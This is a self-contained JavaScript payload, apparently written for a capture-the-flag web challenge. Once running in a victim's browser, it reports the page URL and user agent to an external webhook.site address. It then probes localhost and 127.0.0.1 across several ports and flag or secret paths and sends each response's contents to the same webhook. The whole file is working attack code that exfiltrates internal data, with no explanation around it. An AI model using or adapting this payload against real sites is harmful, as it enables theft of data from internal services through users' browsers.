(async()=>{
const w='https://webhook.site/6eed2f8c-318b-492b-9f49-b3284e99bfd7';

// Send confirmation that script loaded
try{
await fetch(w,{
    method:'POST',
    headers:{'Content-Type':'application/json'},
    body:JSON.stringify({
        stage:'LOADED',
        location:location.href,
        userAgent:navigator.userAgent,
        timestamp:new Date().toISOString()
    })
});
}catch(e){}

// Try to fetch flag from localhost
const ports=[3000,5000,8000,8080,9000];
const paths=['/flag','/flag.txt','/admin/flag','/secret','/api/flag','/'];

for(const port of ports){
    for(const path of paths){
        try{
            const url=`http://localhost:${port}${path}`;
            const response=await fetch(url);
            const text=await response.text();

            // Send to webhook
            await fetch(w,{
                method:'POST',
                headers:{'Content-Type':'application/json'},
                body:JSON.stringify({
                    stage:'DATA',
                    url:url,
                    status:response.status,
                    contentType:response.headers.get('content-type'),
                    data:text.substring(0,3000)
                })
            });

            // If we found flag, send it again for emphasis
            if(text.toLowerCase().includes('flag')||text.toLowerCase().includes('ctf')){
                await fetch(w,{
                    method:'POST',
                    headers:{'Content-Type':'application/json'},
                    body:JSON.stringify({
                        stage:'FLAG_FOUND',
                        url:url,
                        flag:text
                    })
                });
                break;
            }
        }catch(e){}
    }
}

// Also try 127.0.0.1
try{
    const url='http://127.0.0.1:3000/flag';
    const r=await fetch(url);
    const d=await r.text();
    await fetch(w,{
        method:'POST',
        headers:{'Content-Type':'application/json'},
        body:JSON.stringify({stage:'127.0.0.1',url,data:d})
    });
}catch(e){}

// Send completion
await fetch(w,{
    method:'POST',
    headers:{'Content-Type':'application/json'},
    body:JSON.stringify({stage:'COMPLETE'})
}).catch(()=>{});
})();
